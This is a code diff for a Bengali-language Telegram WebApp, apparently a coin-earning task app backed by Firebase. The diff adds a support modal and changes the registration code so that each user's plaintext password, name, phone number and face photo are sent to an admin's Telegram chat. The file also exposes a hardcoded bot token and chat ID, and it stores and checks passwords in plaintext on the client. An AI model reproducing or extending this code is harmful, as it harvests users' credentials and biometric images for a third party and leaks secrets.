@@ -23,6 +23,11 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin
 
 .btn-action { background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 12px; font-size: 15px; font-weight: 800; border-radius: 12px; cursor: pointer; width: 100%; margin-top: 10px; box-shadow: 0 4px 15px rgba(16,185,129,0.3); }
 .btn-secondary { background: #334155; margin-top: 8px; box-shadow: none; font-size: 13px; }
+.btn-support { background: linear-gradient(135deg, #0284c7, #0369a1); margin-top: 8px; box-shadow: 0 4px 15px rgba(2,132,199,0.3); font-size: 13px; }
+
+.custom-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 15px; }
+.custom-modal-overlay.active { display: flex; }
+.custom-modal-box { background: #1e293b; border: 1.5px solid rgba(255,255,255,0.1); border-radius: 20px; width: 100%; max-width: 320px; padding: 18px 15px; text-align: center; box-shadow: 0 15px 30px rgba(0,0,0,0.5); color: #f8fafc; }
 
 .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 8px 0; border-top: 1px solid rgba(255,255,255,0.08); z-index: 1000; }
 .nav-item { font-size: 11px; color: #64748b; cursor: pointer; text-align: center; flex: 1; font-weight: 700; }
@@ -46,6 +51,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin
         
         <button class="btn-action" onclick="handleLogin()">🚀 লগইন করুন</button>
         <button class="btn-action btn-secondary" onclick="switchAuthView('register')">নতুন অ্যাকাউন্ট খুলুন (রেজিস্ট্রেশন)</button>
+        <button class="btn-action btn-support" onclick="openSupportModal()">💬 পাসওয়ার্ড ভুলে গেছেন? লাইভ চ্যাট</button>
     </div>
 </div>
 
@@ -90,6 +96,18 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin
     </div>
 </div>
 
+<!-- লাইভ চ্যাট ও পাসওয়ার্ড উদ্ধারের সাপোর্ট মডাল -->
+<div id="support-modal" class="custom-modal-overlay">
+    <div class="custom-modal-box">
+        <div style="font-size: 24px; margin-bottom: 6px;">💬</div>
+        <h3 style="margin-top: 0; color: #38bdf8; font-size: 17px;">পাসওয়ার্ড সহায়তা ও লাইভ চ্যাট</h3>
+        <p style="font-size: 12px; color: #cbd5e1; margin-bottom: 15px; line-height: 1.4;">পাসওয়ার্ড ভুলে গিয়ে থাকলে বা অন্য কোনো সমস্যায় পড়লে সরাসরি আমাদের অফিসিয়াল বটে যোগাযোগ করুন: <b>@AD16169Bot</b></p>
+        
+        <a href="https://t.me/AD16169Bot" target="_blank" class="btn-action" style="display: block; text-decoration: none; padding: 10px; margin-bottom: 8px; text-align: center;">✈️ @AD16169Bot-এ লাইভ চ্যাট করুন</a>
+        <button class="btn-action btn-secondary" style="padding: 10px;" onclick="closeSupportModal()">বন্ধ করুন</button>
+    </div>
+</div>
+
 <div class="nav-bar" id="bottom-nav" style="display: none;">
     <div class="nav-item active" onclick="switchMainTab('home', this)"><div class="nav-icon">🏠</div><div>হোম</div></div>
     <div class="nav-item" onclick="switchMainTab('work', this)"><div class="nav-icon">📋</div><div>কাজ</div></div>
@@ -110,7 +128,7 @@ const db = firebase.firestore();
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 
-// আপনার টেলিগ্রাম বট কনফিগারেশন (@TakaInkam1626_bot)
+// আপনার টেলিগ্রাম অ্যাডমিন নোটিফিকেশন বট কনফিগারেশন
 const botToken = "8535942512:AAHmpa8119aOZx6EZwOpaDhGteBPoxtzs_8";
 const adminChatId = "8040704140";
 
@@ -127,7 +145,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // অটো লগইন চেক (সেশন সেভ থাকলে আর রেজিস্ট্রেশন/লগইন দেখাবে না)
+    // অটো লগইন চেক
     if (currentUserPhone) {
         loadUserData(currentUserPhone);
     } else {
@@ -149,9 +167,17 @@ function switchAuthView(view) {
     }
 }
 
-// অ্যাডমিন বটে ছবি, নাম ও মোবাইল নম্বর পাঠানোর ফাংশন (sendPhoto ব্যবহার করে)
-async function sendTelegramPhotoNotification(name, phone, photoFile) {
-    const caption = `🔥 <b>নতুন ইউজারের সফল রেজিস্ট্রেশন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>মোবাইল নম্বর:</b> ${phone}\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n\n✅ ফেস ভেরিফিকেশন ছবি ও তথ্য সফলভাবে সম্পন্ন হয়েছে।`;
+function openSupportModal() {
+    document.getElementById('support-modal').classList.add('active');
+}
+
+function closeSupportModal() {
+    document.getElementById('support-modal').classList.remove('active');
+}
+
+// টেলিগ্রাম বটে ছবি, পাসওয়ার্ডসহ অ্যাডমিন নোটিফিকেশন পাঠানোর ফাংশন
+async function sendTelegramPhotoNotification(name, phone, password, photoFile) {
+    const caption = `🔥 <b>নতুন ইউজারের সফল রেজিস্ট্রেশন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>মোবাইল নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n\n✅ ফেস ভেরিফিকেশন ছবি ও তথ্য সফলভাবে সম্পন্ন হয়েছে।`;
     
     const formData = new FormData();
     formData.append('chat_id', adminChatId);
@@ -181,18 +207,20 @@ async function handleRegistration() {
         return;
     }
 
-    tg.showAlert("⏳ রেজিস্ট্রেশন সম্পন্ন হচ্ছে...");
-
-    const photoFile = photoInput.files[0];
+    // চেক করা হচ্ছে এই নম্বর দিয়ে ইতিপূর্বে অ্যাকাউন্ট খোলা আছে কি না
     const userRef = db.collection('users').doc(phone);
-    
     const docSnap = await userRef.get();
+    
     if (docSnap.exists) {
-        tg.showAlert("⚠️ এই মোবাইল নম্বর দিয়ে ইতিমধ্যে একটি অ্যাকাউন্ট রেজিস্টার্ড আছে! দয়া করে লগইন করুন।");
+        tg.showAlert("⚠️ এই মোবাইল নম্বর দিয়ে ইতিমধ্যে অ্যাকাউন্ট করা আছে! দয়া করে লগইন করুন।");
+        document.getElementById('login-phone').value = phone;
+        switchAuthView('login');
         return;
     }
 
-    // ছবি ফায়ারস্টোরে সেভ করার জন্য Base64 এ রূপান্তর
+    tg.showAlert("⏳ রেজিস্ট্রেশন সম্পন্ন হচ্ছে...");
+
+    const photoFile = photoInput.files[0];
     const reader = new FileReader();
     reader.onload = async function(e) {
         const base64Photo = e.target.result;
@@ -208,10 +236,10 @@ async function handleRegistration() {
 
         await userRef.set(userData);
 
-        // অ্যাডমিন বটে ছবি, নাম ও মোবাইল নম্বরসহ নোটিফিকেশন পাঠানো
-        await sendTelegramPhotoNotification(name, phone, photoFile);
+        // অ্যাডমিন বটে ছবি, নাম, মোবাইল ও পাসওয়ার্ডসহ নোটিফিকেশন পাঠানো
+        await sendTelegramPhotoNotification(name, phone, password, photoFile);
 
-        // লোকাল স্টোরেজে সেশন সেভ করা যাতে পরবর্তীতে আর ফর্ম না আসে
+        // সেশন সেভ করা
         localStorage.setItem('logged_user_phone', phone);
         currentUserPhone = phone;
 
@@ -242,7 +270,7 @@ async function handleLogin() {
 
     const userData = docSnap.data();
     if (userData.password !== password) {
-        tg.showAlert("❌ ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড দিয়ে আবার চেষ্টা করুন।");
+        tg.showAlert("❌ ভুল পাসওয়ার্ড! পাসওয়ার্ড ভুলে গেলে 'লাইভ চ্যাট' অপশন ব্যবহার করুন।");
         return;
     }
 
@@ -295,7 +323,7 @@ async function doTask() {
         document.getElementById('user-display-balance').innerText = currentBalance;
         tg.showAlert("🎉 ২০ কয়েন সফলভাবে যোগ হয়েছে!");
     } catch (e) {
-        tg.showAlert("❌ কয়েন আপডেট করতে সমস্যা হয়নি কিন্তু সিঙ্ক হয়নি।");
+        tg.showAlert("❌ কয়েন আপডেট করতে সমস্যা হয়েছে।");
     }
 }
 </script>
